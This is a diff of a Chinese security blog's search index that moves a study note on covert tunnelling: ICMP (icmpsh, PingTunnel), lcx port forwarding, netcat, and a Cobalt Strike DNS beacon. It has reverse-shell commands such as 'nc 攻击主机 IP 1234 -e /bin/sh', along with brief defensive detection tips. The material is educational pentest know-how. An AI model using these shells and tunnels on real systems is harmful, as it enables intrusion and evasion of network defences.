+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402123749265.png" alt="image-20220402123749265"></p>
+<p>然后kali执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python icmpsh_m.py 本机ip 目标ip</span><br></pre></td></tr></table></figure>
+
+<p>win7直接执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icmpsh.exe -t 攻击机ip（kali）</span><br></pre></td></tr></table></figure>
+
+<p>kali即可接受icmp反弹回来的shell</p>
+<h3 id="PingTunnel"><a href="#PingTunnel" class="headerlink" title="*PingTunnel"></a>*PingTunnel</h3><p>PingTunnel也是一款常用的 ICMP隧道工具，可以跨平台使用。为了避免隧道被滥用，可以为隧道设置密码。</p>
+<p>pingtunnel是把tcp&#x2F;udp&#x2F;sock5流量伪装成 icmp流量进行转发的工具</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p表示连接icmp隧道另一端的机器IP(即目标服务器)</span><br><span class="line">-lp表示需要监听的本地 tcp端口</span><br><span class="line">-da指定需要转发的机器的IP(即目标内网某—机器的内网IP)</span><br><span class="line">-dp指定需要转发的机器的端口(即目标内网某一机器的内网端口)</span><br><span class="line">-x设置连接的密码</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402220039638.png" alt="image-20220402220039638"></p>
+<p>Webserver: .&#x2F;ptunnel -x xiaodi （建立一个隧道，提供密码，等待别人连接）</p>
+<p>Hacker xiaodi:.&#x2F;ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi #转发的3389请求数据给本地1080</p>
+<p>Hacker xiaodi: rdesktop 127.0.0.1 1080</p>
+<p><a href="https://github.com/f1vefour/ptunnel">老版本介绍</a>需自行编译</p>
+<p><a href="https://github.com/esrrhs/pingtunnel">新版本介绍</a>二次开发版本</p>
+<h3 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h3><p>许多网络管理员会阻止ICMP通信进入站点。但是在出站方向,ICMP通信是被允许的，而且目前大多数的网络和边界设备不会过滤ICMP流量。使用ICMP隧道时会产生大量的ICMP数据包，我们可以通过Wireshark进行ICMP数据包分析，以检测恶意ICMP流量，具体方法如下。</p>
+<p>·检测同一来源的icmp数据包的数量.一个正常的ping命令每秒最多发送两个数据包，而使用icmp隧道的浏览器会在很短的时间内产生上千个icmp数据包.</p>
+<p>·注意那些Payload大于64bit的 ICMP数据包。</p>
+<p>·寻找响应数据包中的Payload与请求数据包中的 Payload不一致的ICMP数据包。</p>
+<p>·检查ICMP 数据包的协议标签。例如，icmptunnel 会在所有的 ICMP Payload前面添加“TUNL”标记来标识隧道——这就是特征。</p>
+<h1 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h1><p>传输层技术包括TCP隧道、UDP隧道和常规端口转发等。在渗透测试中,如果内网防火墙阻止了对指定端口的访问，在获得目标机器的权限后，可以使用IPTABLES打开指定端口。如果内网中存在一系列防御系统,TCP、UDP 流量会被大量拦截。</p>
+<h2 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="*lcx端口转发"></a>*lcx端口转发</h2><p>首先介绍最为经典的端口转发工具lcx。lcx是一个基于Socket套接字实现的端口转发工具，有Windows和 Linux两个版本。Windows版为 Icx.exe，Linux版为portmap。一个正常的Socket隧道必须具备两端:一端为服务端，监听一个端口，等待客户端的连接;另一端为客户端，通过传入服务端的IP地址和端口，才能主动与服务器连接。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 将本地 3389 给攻击 IP 的 3131</span><br><span class="line">lcx -slave 攻击 IP 3131 127.0.0.1 3389</span><br><span class="line"># 监听 3131 转发至 3333</span><br><span class="line">lcx -listen 3131 3333</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="netcat"><a href="#netcat" class="headerlink" title="*netcat"></a>*netcat</h2><p>之所以叫作netcat，是因为它是网络上的cat。cat 的功能是读取一个文件的内容并输出到屏幕上，netcat 也是如此——从网络的一端读取数据，输出到网络的另一端（可以使用TCP和 UDP协议)。</p>
+<p>正向：攻击连接受害</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 受害</span><br><span class="line">nc -ldp 1234 -e /bin/sh</span><br><span class="line">nc -ldp 1234 -e c:\windows\system32\cmd.exe</span><br><span class="line"></span><br><span class="line"># 攻击主动连接</span><br><span class="line">nc 192.168.76.132 1234（受害者的ip地址）</span><br></pre></td></tr></table></figure>
+
+
+
+<p>反向：受害连接攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 攻击</span><br><span class="line">nc -lvp 1234</span><br><span class="line"></span><br><span class="line"># 受害主动连接</span><br><span class="line">nc 攻击主机 IP 1234 -e /bin/sh</span><br><span class="line">nc 攻击主机 IP 1234 -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>多向连接反弹shell-配合转发</p>
+<p>god\Webserver: Lcx.exe -listen 22223333<br>god\Sqlserver: nc 192.168.3.31 2222 -e c:\windows\system32\cmd.exe</p>
+<p>kali或本机: nc -v 192.168.76.1433333</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指纹服务: nc -nv 192.168.76.143</span><br><span class="line">端口扫描: nc -v -z 192.168.76.143 1-100</span><br><span class="line">端口监听: nc -lvp xxxx</span><br><span class="line">文件传输: nc -lp 1111 &gt;1.txt|nc -vn xx.XX.X.x 1111 &lt;1.txt -q 1</span><br><span class="line">反弹Shell:见上</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h2><p>PowerCat可以说是nc 的 PowerShell 版本。PowerCat可以通过执行命令回到本地运行，也可以使用远程权限运行。</p>
+<h1 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h1><h2 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a>SSH协议</h2><p>在内网中,几乎所有的Linux&#x2F;UNIX服务器和网络设备都支持SSH协议。在一般情况下,SSH协议是被允许通过防火墙和边界设备的，所以经常被攻击者利用。同时，SSH协议的传输过程是加密的,所以我们很难区分合法的SSH会话和攻击者利用其他网络建立的隧道。攻击者使用SSH端口隧道突破防火墙的限制后,能够建立-一些之前无法建立的TCP连接。</p>
+<h2 id="HTTP-x2F-HTTPS"><a href="#HTTP-x2F-HTTPS" class="headerlink" title="HTTP&#x2F;HTTPS"></a>HTTP&#x2F;HTTPS</h2><p>HTTP Service代理用于将所有的流量转发到内网。常见的代理工具有reGeorg、meterpreter,tunna 等。</p>
+<h2 id="DNS协议-1"><a href="#DNS协议-1" class="headerlink" title="*DNS协议"></a>*DNS协议</h2><p>​    DNS协议是一种请求&#x2F;应答协议，也是一种可用于应用层的隧道技术。虽然激增的DNS流量可能会被发现,但基于传统Socket隧道已经濒临淘汰及TCP、UDP通信大量被防御系统拦截的状况，DNS、ICMP、HTTP&#x2F;HTTPS等难以被禁用的协议已成为攻击者控制隧道的主流渠道。<br>​    通过本章前面的内容，我们已经对隧道技术有了一定的了解。一方面，在网络世界中，DNS是一个必不可少的服务;另一方面，DNS 报文本身具有穿透防火墙的能力。由于防火墙和入侵检测设备大都不会过滤 DNS流量，也为DNS成为隐蔽信道创造了条件。越来越多的研究证明，DNS隧道在僵尸网络和APT攻击中扮演着重要的角色。<br>​    用于管理僵尸网络和进行APT攻击的服务器叫作C&amp;C服务器(Command and Control Server,命令及控制服务器)。C&amp;C节点分为两种，分别是C&amp;C服务端(攻击者)和C&amp;C客户端（被控制的计算机)。C&amp;C通信是指植入C&amp;C客户端的木马或者后门程序与C&amp;C服务端上的远程控制程序之间的通信。正常网络之间的通信,都是在两台机器之间建立TCP 连接后进行的。在进行数据通信时:如果目标是IP地址，可以直接发送报文;如果目标是域名，会先将域名解析成IP地址，再进行通信。两台机器建立连接后,C&amp;C服务端就可以将指令传递给C&amp;C客户端上的木马(后门)程序，让其受到控制。</p>
+<p>​        内网中安装了各种软&#x2F;硬件防护设施来检查主机与外部网络的连接情况很多厂商会收集C&amp;C服务端的域名、IP地址、URL等数据，帮助防火墙进行阻断操作。这样一来，C&amp;C通信就会被切断。于是，通过各种隧道技术实现C&amp;C通信的技术（特别是DNS隧道技术)出现了。<br>​        DNS隧道的工作原理很简单:在进行DNS查询时，如果查询的域名不在 DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠 DNS协议即可进行数据包的交换。从 DNS 协议的角度看，这样的操作只是在一次次地查询某个特定的域名并得到解析结果，但其本质问题是，预期的返回结果应该是一个IP地址，而事实上不是——返回的可以是任意字符串，包括加密的C&amp;C指令。</p>
+<p>1.云主机Teamserver配置端口53 启用-udp</p>
+<p>2.买一个域名，修改解析记录如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A记录-&gt;cs主机名-&gt;CS服务器IP</span><br><span class="line">NS记录-&gt;ns1主机名-&gt;上个A记录地址</span><br><span class="line">NS记录-&gt;ns2主机名-&gt;上个A记录地址</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; checkin</span><br><span class="line">[*]Tasked beacon to checkin</span><br><span class="line">beacon&gt; mode dns-txt</span><br><span class="line">beacon&gt; shell whoami</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>隐藏通信隧道</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>面试题整理</title>
     <url>/2022/04/03/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/</url>
     <content><![CDATA[<span id="more"></span>
@@ -1267,126 +1387,6 @@
       </categories>
       <tags>
         <tag>杂识</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>隐藏通信隧道</title>
-    <url>/2022/02/17/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93/</url>
-    <content><![CDATA[<span id="more"></span>
-
-<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>一般的网络通信，两个机器先建立TCP连接，然后正常数据通信，知道ip地址后可直接发送报文，不知道可以用域名解析，但是在实际中，可通过边界设备、软硬waf、ids检查阻断连接。</p>
-<p>隧道就是绕过端口屏蔽的通信方式，waf两端数据包通过waf允许的数据包类型或端口进行封装，穿过防火墙，进行通信。当封装的数据包到达目的地，进行还原，并将其还原后的数据包发送到相应的服务器上。</p>
-<p>CS、MSF无法上线，数据传输不稳定无回显、出口数据被监控、网络通信存在问题。</p>
-<p>常用隧道：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网络层：IPv6、ICMP、GRE</span><br><span class="line">传输层：TCP、UDP、常规端口</span><br><span class="line">应用层：SSH、HTTP、HTTPS、DNS</span><br></pre></td></tr></table></figure>
-
-<h2 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h2><p>执行ping</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402090732542.png" alt="image-20220402090732542"></p>
-<h2 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h2><p>netcat（nc）瑞士军刀，工具，通过使用TCP或者UDP协议的网络连接读写数据。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402091737750.png" alt="image-20220402091737750"></p>
-<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p>curl是一个利用url规则在命令行下工作的综合文件传输工具，支持文件上传下载。curl不仅支持HTTP、HTTPS、FTP等多种协议，还支持POST、Cookie、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。Linux操作系统自带curl命令。在Windows操作系统中,需要下载并安装curl命令</p>
-<p>在使用curl时,需要执行“curl&lt; IP地址:端口号 &gt;”命令。如果远程主机开启了相应的端口，会输出相应的端口信息，如图3-3所示。如果远程主机没有开通相应的端口，则没有任何提示。按“Ctrl+C”键即可断开连接。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402092506527.png" alt="image-20220402092506527"></p>
-<h2 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h2><p>在进行 DNS连通性检测时，常用的命令为nslookup和 dig。<br>nslookup是 Windows操作系统自带的 DNS 探测命令，其用法如下所示。在没有指定 vps-ip时，nslookup 会从系统网络的TCP&#x2F;IP属性中读取 DNS服务器的地址。具体的使用方法是:打开Windows操作系统的命令行环境,输人“nslookup”命令,按“回车”键,然后输入“help”命令</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402092938431.png" alt="image-20220402092938431"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup www.baidu.com vps-ip</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402093948502.png" alt="image-20220402093948502"></p>
-<p>dig是 Linux默认自带的 DNS 探测命令，其用法如下所示。在没有指定vps-ip时,dig会到<br>&#x2F;etc&#x2F;resolv.conf文件中读取系统配置的 DNS服务器的地址。如果vps-ip为192.168.43.1，将解析百度网的IP地址，说明目前DNS协议是连通的,如图3-5所示。具体的使用方法，可在 Linux命令行环境中输入“dig -h”命令获取。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig @vps-ip www.baidu.com（解析结果）</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402093550235.png" alt="image-20220402093550235"></p>
-<p>还有一种情况是流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段上网的场景。常用的判断方法如下。<br>    查看网络连接，判断是否存在与其他机器的8080（不绝对）等端口的连接（可以尝试运行”ping -n 1 -a ip”命令)。<br>②查看内网中是否有主机名类似于“proxy”的机器。</p>
-<p>③查看IE浏览器的直接代理。</p>
-<p>④根据pac文件的路径（可能是本地路径，也可能是远程路径)，将其下载下来并查看。</p>
-<p>⑤执行如下命令，利用curl工具进行确认。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl www.baidu. com//不通</span><br><span class="line">curl -x proxy-ip:port www.baidu . com//通</span><br></pre></td></tr></table></figure>
-
-<h1 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h1><p>在网络层中，两个常用的 隧道协议是IPv6和ICMP，下面进行介绍</p>
-<h2 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a>IPv6隧道</h2><h3 id="技术简介"><a href="#技术简介" class="headerlink" title="技术简介"></a>技术简介</h3><p>“IPv6”是“Internet Protocol Version 6”的缩写，也被称为下一代互联网协议。它是由IETF设计用来代替现行的IPv4协议的一种新的IP协议。IPv4协议已经使用了20多年，目前面临着地址匮乏等一系列问题，而IPv6则能从根本上解决这些问题。现在，由于IPv4资源几乎耗尽，IPv6开始进入过渡阶段。</p>
-<p>IPv6隧道技术是指通过IPv4隧道传送 IPv6 数据报文的技术。为了在IPv4海洋中传递IPv6信息，可以将IPv4作为隧道载体,将IPv6报文整体封装在IPv4数据报文中,使IPv6报文能够穿过IPv4海洋,到达另一个IPv6小岛。<br>打个比方，快递公司收取包裹之后，发现自己在目的地没有站点，无法投送，则将此包裹转交给能到达目的地的快递公司（例如中国邮政）来投递。也就是说，将快递公司已经封装好的包裹（类似于IPv6报文)，用中国邮政的包装箱再封装一次（类似于封装成IPv4报文)，以便这个包裹在中国邮政的系统（IPv4海洋）中被正常投递。</p>
-<p>攻击者有时会通过恶意软件来配置允许进行IPv6通信的设备，以避开防火墙和入侵检测系统。有一点需要指出:即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包。<br>配置隧道和自动隧道的主要区别是:只有在执行隧道功能的节点的IPv6地址是 IPv4兼容地址时，自动隧道才是可行的。在为执行隧道功能的节点分配IP地址时,如果采用的是自动隧道方法，就不需要进行配置。<br>配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如采用DHCP、人工配置或其他 IPv4的配置机制。<br>支持IPv6的隧道工具有socat、6tunnel、nt6tunnel 等。</p>
-<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>针对IPv6隧道攻击，最好的防御方法是:了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信,提高主机和应用程序的安全性。</p>
-<h2 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h2><p>ICMP隧道简单、实用,是一个比较特殊的协议。在一般的通信协议里,如果两台设备要进行通信，肯定需要开放端口，而在ICMP协议下就不需要。最常见的ICMP消息为ping 命令的回复，攻击者可以利用命令行得到比回复更多的ICMP请求。在通常情况下，每个 ping命令都有相对应的回复与请求。</p>
-<p>在一些网络环境中,如果攻击者使用各类上层隧道(例如 HTTP隧道、DNS隧道、常规正&#x2F;反向端口转发等）进行的操作都失败了，常常会通过ping 命令访问远程计算机，尝试建立ICMP隧道,将 TCP&#x2F;UDP 数据封装到ICMP的 ping 数据包中，从而穿过防火墙(通常防火墙不会屏蔽ping 数据包)，实现不受限制的网络访问。</p>
-<p>常用的ICMP隧道工具有icmpsh、PingTunnel、icmptunnel、powershell icmp等。</p>
-<h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>kali linux安装icmpsh</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/inquisb/icmpsh.git</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402123633553.png" alt="image-20220402123633553"></p>
-<p>安装 Python的 impacket类库,以便对TCP、UDP、ICMP、IGMP、ARP、IPv4、IPv6、SMB、MSRPC、NTLM、Kerberos、WMI、LDAP等协议进行访问。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install python-impacket </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402123728167.png" alt="image-20220402123728167"></p>
-<p>因为 icmpsh 工具要代替系统本身的 ping命令的应答程序，所以需要输入如下命令来关闭本地系统的ICMP应答(（如果要恢复系统应答，则设置为0)，否则 Shell 的运行会不稳定（表现为一直刷屏，无法进行交互输入)。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402123749265.png" alt="image-20220402123749265"></p>
-<p>然后kali执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python icmpsh_m.py 本机ip 目标ip</span><br></pre></td></tr></table></figure>
-
-<p>win7直接执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icmpsh.exe -t 攻击机ip（kali）</span><br></pre></td></tr></table></figure>
-
-<p>kali即可接受icmp反弹回来的shell</p>
-<h3 id="PingTunnel"><a href="#PingTunnel" class="headerlink" title="*PingTunnel"></a>*PingTunnel</h3><p>PingTunnel也是一款常用的 ICMP隧道工具，可以跨平台使用。为了避免隧道被滥用，可以为隧道设置密码。</p>
-<p>pingtunnel是把tcp&#x2F;udp&#x2F;sock5流量伪装成 icmp流量进行转发的工具</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p表示连接icmp隧道另一端的机器IP(即目标服务器)</span><br><span class="line">-lp表示需要监听的本地 tcp端口</span><br><span class="line">-da指定需要转发的机器的IP(即目标内网某—机器的内网IP)</span><br><span class="line">-dp指定需要转发的机器的端口(即目标内网某一机器的内网端口)</span><br><span class="line">-x设置连接的密码</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402220039638.png" alt="image-20220402220039638"></p>
-<p>Webserver: .&#x2F;ptunnel -x xiaodi （建立一个隧道，提供密码，等待别人连接）</p>
-<p>Hacker xiaodi:.&#x2F;ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi #转发的3389请求数据给本地1080</p>
-<p>Hacker xiaodi: rdesktop 127.0.0.1 1080</p>
-<p><a href="https://github.com/f1vefour/ptunnel">老版本介绍</a>需自行编译</p>
-<p><a href="https://github.com/esrrhs/pingtunnel">新版本介绍</a>二次开发版本</p>
-<h3 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h3><p>许多网络管理员会阻止ICMP通信进入站点。但是在出站方向,ICMP通信是被允许的，而且目前大多数的网络和边界设备不会过滤ICMP流量。使用ICMP隧道时会产生大量的ICMP数据包，我们可以通过Wireshark进行ICMP数据包分析，以检测恶意ICMP流量，具体方法如下。</p>
-<p>·检测同一来源的icmp数据包的数量.一个正常的ping命令每秒最多发送两个数据包，而使用icmp隧道的浏览器会在很短的时间内产生上千个icmp数据包.</p>
-<p>·注意那些Payload大于64bit的 ICMP数据包。</p>
-<p>·寻找响应数据包中的Payload与请求数据包中的 Payload不一致的ICMP数据包。</p>
-<p>·检查ICMP 数据包的协议标签。例如，icmptunnel 会在所有的 ICMP Payload前面添加“TUNL”标记来标识隧道——这就是特征。</p>
-<h1 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h1><p>传输层技术包括TCP隧道、UDP隧道和常规端口转发等。在渗透测试中,如果内网防火墙阻止了对指定端口的访问，在获得目标机器的权限后，可以使用IPTABLES打开指定端口。如果内网中存在一系列防御系统,TCP、UDP 流量会被大量拦截。</p>
-<h2 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="*lcx端口转发"></a>*lcx端口转发</h2><p>首先介绍最为经典的端口转发工具lcx。lcx是一个基于Socket套接字实现的端口转发工具，有Windows和 Linux两个版本。Windows版为 Icx.exe，Linux版为portmap。一个正常的Socket隧道必须具备两端:一端为服务端，监听一个端口，等待客户端的连接;另一端为客户端，通过传入服务端的IP地址和端口，才能主动与服务器连接。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 将本地 3389 给攻击 IP 的 3131</span><br><span class="line">lcx -slave 攻击 IP 3131 127.0.0.1 3389</span><br><span class="line"># 监听 3131 转发至 3333</span><br><span class="line">lcx -listen 3131 3333</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="netcat"><a href="#netcat" class="headerlink" title="*netcat"></a>*netcat</h2><p>之所以叫作netcat，是因为它是网络上的cat。cat 的功能是读取一个文件的内容并输出到屏幕上，netcat 也是如此——从网络的一端读取数据，输出到网络的另一端（可以使用TCP和 UDP协议)。</p>
-<p>正向：攻击连接受害</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 受害</span><br><span class="line">nc -ldp 1234 -e /bin/sh</span><br><span class="line">nc -ldp 1234 -e c:\windows\system32\cmd.exe</span><br><span class="line"></span><br><span class="line"># 攻击主动连接</span><br><span class="line">nc 192.168.76.132 1234（受害者的ip地址）</span><br></pre></td></tr></table></figure>
-
-
-
-<p>反向：受害连接攻击</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 攻击</span><br><span class="line">nc -lvp 1234</span><br><span class="line"></span><br><span class="line"># 受害主动连接</span><br><span class="line">nc 攻击主机 IP 1234 -e /bin/sh</span><br><span class="line">nc 攻击主机 IP 1234 -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
-
-
-
-<p>多向连接反弹shell-配合转发</p>
-<p>god\Webserver: Lcx.exe -listen 22223333<br>god\Sqlserver: nc 192.168.3.31 2222 -e c:\windows\system32\cmd.exe</p>
-<p>kali或本机: nc -v 192.168.76.1433333</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指纹服务: nc -nv 192.168.76.143</span><br><span class="line">端口扫描: nc -v -z 192.168.76.143 1-100</span><br><span class="line">端口监听: nc -lvp xxxx</span><br><span class="line">文件传输: nc -lp 1111 &gt;1.txt|nc -vn xx.XX.X.x 1111 &lt;1.txt -q 1</span><br><span class="line">反弹Shell:见上</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h2><p>PowerCat可以说是nc 的 PowerShell 版本。PowerCat可以通过执行命令回到本地运行，也可以使用远程权限运行。</p>
-<h1 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h1><h2 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a>SSH协议</h2><p>在内网中,几乎所有的Linux&#x2F;UNIX服务器和网络设备都支持SSH协议。在一般情况下,SSH协议是被允许通过防火墙和边界设备的，所以经常被攻击者利用。同时，SSH协议的传输过程是加密的,所以我们很难区分合法的SSH会话和攻击者利用其他网络建立的隧道。攻击者使用SSH端口隧道突破防火墙的限制后,能够建立-一些之前无法建立的TCP连接。</p>
-<h2 id="HTTP-x2F-HTTPS"><a href="#HTTP-x2F-HTTPS" class="headerlink" title="HTTP&#x2F;HTTPS"></a>HTTP&#x2F;HTTPS</h2><p>HTTP Service代理用于将所有的流量转发到内网。常见的代理工具有reGeorg、meterpreter,tunna 等。</p>
-<h2 id="DNS协议-1"><a href="#DNS协议-1" class="headerlink" title="*DNS协议"></a>*DNS协议</h2><p>​    DNS协议是一种请求&#x2F;应答协议，也是一种可用于应用层的隧道技术。虽然激增的DNS流量可能会被发现,但基于传统Socket隧道已经濒临淘汰及TCP、UDP通信大量被防御系统拦截的状况，DNS、ICMP、HTTP&#x2F;HTTPS等难以被禁用的协议已成为攻击者控制隧道的主流渠道。<br>​    通过本章前面的内容，我们已经对隧道技术有了一定的了解。一方面，在网络世界中，DNS是一个必不可少的服务;另一方面，DNS 报文本身具有穿透防火墙的能力。由于防火墙和入侵检测设备大都不会过滤 DNS流量，也为DNS成为隐蔽信道创造了条件。越来越多的研究证明，DNS隧道在僵尸网络和APT攻击中扮演着重要的角色。<br>​    用于管理僵尸网络和进行APT攻击的服务器叫作C&amp;C服务器(Command and Control Server,命令及控制服务器)。C&amp;C节点分为两种，分别是C&amp;C服务端(攻击者)和C&amp;C客户端（被控制的计算机)。C&amp;C通信是指植入C&amp;C客户端的木马或者后门程序与C&amp;C服务端上的远程控制程序之间的通信。正常网络之间的通信,都是在两台机器之间建立TCP 连接后进行的。在进行数据通信时:如果目标是IP地址，可以直接发送报文;如果目标是域名，会先将域名解析成IP地址，再进行通信。两台机器建立连接后,C&amp;C服务端就可以将指令传递给C&amp;C客户端上的木马(后门)程序，让其受到控制。</p>
-<p>​        内网中安装了各种软&#x2F;硬件防护设施来检查主机与外部网络的连接情况很多厂商会收集C&amp;C服务端的域名、IP地址、URL等数据，帮助防火墙进行阻断操作。这样一来，C&amp;C通信就会被切断。于是，通过各种隧道技术实现C&amp;C通信的技术（特别是DNS隧道技术)出现了。<br>​        DNS隧道的工作原理很简单:在进行DNS查询时，如果查询的域名不在 DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠 DNS协议即可进行数据包的交换。从 DNS 协议的角度看，这样的操作只是在一次次地查询某个特定的域名并得到解析结果，但其本质问题是，预期的返回结果应该是一个IP地址，而事实上不是——返回的可以是任意字符串，包括加密的C&amp;C指令。</p>
-<p>1.云主机Teamserver配置端口53 启用-udp</p>
-<p>2.买一个域名，修改解析记录如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A记录-&gt;cs主机名-&gt;CS服务器IP</span><br><span class="line">NS记录-&gt;ns1主机名-&gt;上个A记录地址</span><br><span class="line">NS记录-&gt;ns2主机名-&gt;上个A记录地址</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; checkin</span><br><span class="line">[*]Tasked beacon to checkin</span><br><span class="line">beacon&gt; mode dns-txt</span><br><span class="line">beacon&gt; shell whoami</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>内网</category>
-      </categories>
-      <tags>
-        <tag>隐藏通信隧道</tag>
       </tags>
   </entry>
 </search>
